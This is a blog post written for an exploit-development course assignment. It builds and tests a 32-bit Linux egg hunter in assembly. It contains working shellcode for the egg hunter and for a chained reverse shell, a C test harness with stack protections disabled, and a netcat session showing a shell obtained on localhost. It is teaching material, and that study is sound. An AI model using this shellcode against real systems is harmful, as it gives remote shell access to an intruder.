---
title: "SLAE32 - Assignment #3 - Egg Hunter"
tags: ["slae32", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 3<sup>rd</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.

The purpose of this assignment is to create an Egg Hunter shellcode. An Egg Hunter is the first stage of a multistage payload. It consists of a piece of code that scans memory for a specific pattern and moves execution to that location. The pattern is a 4 byte string referred to as an egg. The Egg Hunter searches for two instances of where one directly follows the other. More details can be found at: <a href="https://www.coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-3-egg-hunters" target="_blank">The Basics of Exploit Development 3: Egg Hunters</a>.

My code can be found in my Github: <a href="https://github.com/geobour98/slae32" target="_blank">geobour98's Github</a>.

## Egg Hunter in Detail

A great paper showcasing Egg Hunting techniques in Linux and Windows in great detail can be found at: <a href="https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank">Safely Searching Process Virtual Address Space</a>. The code is based on one of the implementations described there.

This implementation is based on the syscall `access`. It checks user's permissions for a specific file. The header file `/usr/include/i386-linux-gnu/asm/unistd_32.h` shows the number for `accesss`.

| Syscall | Definition |
| -- | -- |
| `access` | `#define __NR_access 33` |

The syscall's prototype is the following:

```shell
int access(const char *pathname, int mode);
```

If `pathname` points outside of the accessible address space, then `EFAULT` is returned. So we will use this error in order to search memory page by memory page for 2 consecutive instances of the egg. If this error is returned, we should search in another memory page for the egg. 

## Egg Hunter in Assembly

We start by setting the `EBX` register with the egg value. It is the following 4 bytes value: `0x50905090`. This value will later be searched for 2 consecutive instances, in total 8 bytes, in order to execute the shellcode coming after it.

```nasm
	mov ebx, 0x50905090	; move the 4 bytes egg in ebx
```

Then, we clear the `ECX` register and perform a multiplication instruction that multiplies the contents of `ECX` with the contents of `EAX` and stores the upper 32 bits of the product at `EDX` and the lower 32 bits at `EAX`. In our case the product is `0`, so both register values become `0` too.

```nasm
	xor ecx, ecx		; clear ecx register
	mul ecx				; multiply ecx with eax and store upper bits in edx and lower in eax, both 0
```

After that, we declare the procedure `next_page`, where we perform an `OR` bitwise operation between `DX`, which has `0` value from before, and the hexadecimal value `0xfff`, `4095` in decimal, that results in the same `0xfff` value. Our goal with this procedure is to go to the next memory page, when we have found the memory address pointing by `EBX` (explained later) is invalid, meaning that the rest of the addresses in this page are invalid too. This means that the egg isn't there. The default memory page size is 4096 bytes, so we cover with `next_page` the 4095 first bytes and the last one with `next_address`. 

```nasm
next_page:
	or dx, 0xfff		; page alignment operation
						; default page size is 4096 bytes (next_page + next_address = 4096 => 4095 + 1 = 4096)
```

Then, we declare the procedure `next_address`, where we increment the value of `EDX` by one. This procedure serves the purpose explained above.

```nasm
next_address:
	inc edx			; increment edx by 1 to reach the page size of 4096
```

At this point we want the values of all the registers to be saved at the stack, so they are preserved after the execution of the syscall `accept`.

```nasm
	pusha			; push all registers on the stack
```

We save 8 bytes from the start of the `EDX` register at `EBX` in order to be validated at once. That means that is impossible for the memory address pointing by `EDX` to be valid and the memory address pointing by `EDX + 4` to be invalid.

```nasm
	lea ebx, [edx + 0x4]	; ebx is set with the value of edx plus 4, so 8 bytes are validated at once
```

We pass the hexadecimal value `0x21` (`33` in decimal) to `AL` as the `access` syscall number.

```nasm
	mov al, 0x21		; 21 is the hex value of the decimal 33 for access syscall
```

The final step for the `accept` syscall is to invoke a syscall interrupt in order to be executed.

```nasm
	int 0x80		; exec access syscall
```

The returned value from the `accept` syscall is stored in `EAX` register, so we want to compare the `AL` part with the hexadecimal value `0xf2`, which is the low byte of the `EFAULT` return value. If they are equal, the Zero Flag (`ZF`) is set and it means that we want to go to the next memory page to search for the egg.

```nasm
	cmp al, 0xf2		; compare return value of accept with 0xf2 (low byte of EFAULT return value)
```

We restore the values from the stack, especially the `EBX` value that is the egg.

```nasm
	popa			; pop all registers from the stack
```

Then, if the `ZF` was set from `cmp` instruction, we jump to the `next_page` procedure in order to go to the next memory page.

```nasm
	jz next_page		; jump short to next_page if zero (ZF = 1)
``` 

If the `ZF` from before isn't set, it means we have a valid memory address. So we can compare the value pointing by `EDX` with the egg value at `EBX`. If they match, meaning that we found the egg for the first time, we continue through the code. Otherwise, we jump to the `next_address` procedure in order to search for the egg in the next memory address.

```nasm
	cmp [edx], ebx		; if the egg in ebx doesn't match edx content go to the next address
	jnz next_address	; jump short if not zero (ZF = 0)
```

If the `ZF` is set from before, meaning we have the egg for the first time, we can compare the value of the next address (`EDX + 4`) with the egg again to identify if we have 2 consecutive instances of the egg and we can execute the following shellcode. Otherwise, we jump to the `next_address` again.

```nasm
	cmp [edx + 0x4], ebx	; if the egg in ebx doesn't match edx+4 content go to the next address again
	jnz next_address		; jump short if not zero (ZF = 0)
```

Finally, at this point we have found 2 consecutive instances of the egg and we can jump at the shellcode in order to execute it.

```nasm
	jmp edx			; egg is found, jump short at edx (our shellcode)
```

The whole `Assembly` program is the following:

```nasm
; Egg Hunter
; Author: geobour98 

global _start

section .text

_start:
	mov ebx, 0x50905090	; move the 4 bytes egg in ebx

	xor ecx, ecx		; clear ecx register
	mul ecx			; multiply ecx with eax and store upper bits in edx and lower in eax, both 0

next_page:
	or dx, 0xfff		; page alignment operation
				; default page size is 4096 bytes (next_page + next_address = 4096 => 4095 + 1 = 4096)

next_address:
	inc edx			; increment edx by 1 to reach the page size of 4096
	
	pusha			; push all registers on the stack
	lea ebx, [edx + 0x4]	; ebx is set with the value of edx plus 4, so 8 bytes are validated at once

	mov al, 0x21		; 21 is the hex value of the decimal 33 for access syscall

	int 0x80		; exec access syscall

	cmp al, 0xf2		; compare return value of accept with 0xf2 (low byte of EFAULT return value)

	popa			; pop all registers from the stack

	jz next_page		; jump short to next_page if zero (ZF = 1)

	cmp [edx], ebx		; if the egg in ebx doesn't match edx content go to the next address
	jnz next_address	; jump short if not zero (ZF = 0)

	cmp [edx + 0x4], ebx	; if the egg in ebx doesn't match edx+4 content go to the next address again
	jnz next_address	; jump short if not zero (ZF = 0)

	jmp edx			; egg is found, jump short at edx (our shellcode)
```

## Testing the Egg Hunter

In order to prove that the Egg Hunter is working, we first have to compile the `Assembly` code. This process consists of assembling and linking, which are described in previous blog posts.

The following `bash` script automates that process:

```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -felf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The following command does the compilation and creates the executable `egg-hunter`:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ ./compile.sh egg-hunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

The next step is to extract the shellcode from the `egg-hunter` executable in order to test it with another shellcode. The `objdump` program, which displays information from object files, is used with the following one-liner:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ objdump -d ./egg-hunter | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
```

Now we have extracted the shellcode and we will test it with the reverse shell created in the previous blog post. So, we need to extract the shellcode from the `reverse` executable with the previous `objdump` command:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ objdump -d ./reverse | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\xcd\x80\x89\xc3\x31\xc0\x66\xb8\x6a\x01\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x31\xc9\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\xb0\x0b\x31\xd2\x52\x52\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```

After that, we modify the `C` program provided in the course materials that checks if a shellcode is working. The `code` array contains the shellcode generated by `objdump` but at the start we have put the egg value twice in little endian format. So it has become `\x90\x50\x90\x50\x90\x50\x90\x50`. When the Egg Hunter shellcode gets executed it will search for that pattern and execute the shellcode coming after that, which is our reverse shell. Then we declare the `egghunter` shellcode. After that we print the lengths of both shellcodes. Finally, we perform typecasting on the `egghunter` shellcode and execute the `ret()` function that executes the `egghunter` shellcode, which then calls `code`.

The whole `C` program is the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\xcd\x80\x89\xc3\x31\xc0\x66\xb8\x6a\x01\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x31\xc9\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\xb0\x0b\x31\xd2\x52\x52\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

unsigned char egghunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));
	printf("Egg Hunter Length: %d\n", strlen(egghunter));

        int (*ret)() = (int(*)())egghunter;

        ret();

	return 0;
}
```

Now we need to compile the `C` program, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

We test the Egg Hunter and the Reverse Shell by creating a listener on port `4444` with `nc` in one terminal window and in another we execute the executable `shellcode`. Then, back to the first we verify the incoming connection and run the commands `id` and `ls`.

1<sup>st</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ nc -lvnp 4444
```

2<sup>nd</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ ./shellcode 
Shellcode Length:  93
Egg Hunter Length: 39

```

1<sup>st</sup> window again:

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 48292)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
egg-hunter
egg-hunter.nasm
egg-hunter.o
reverse
shellcode
shellcode.c
exit
geobour98@slae32-dev:~/SLAE/custom/SLAE32/3_Egg_hunter$ 
```

## Summary

We have a working Egg Hunter shellcode that calls the Reverse Shell shellcode and we get a connection back on port 4444.

Next will be the Custom Encoder!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE32 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=3
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
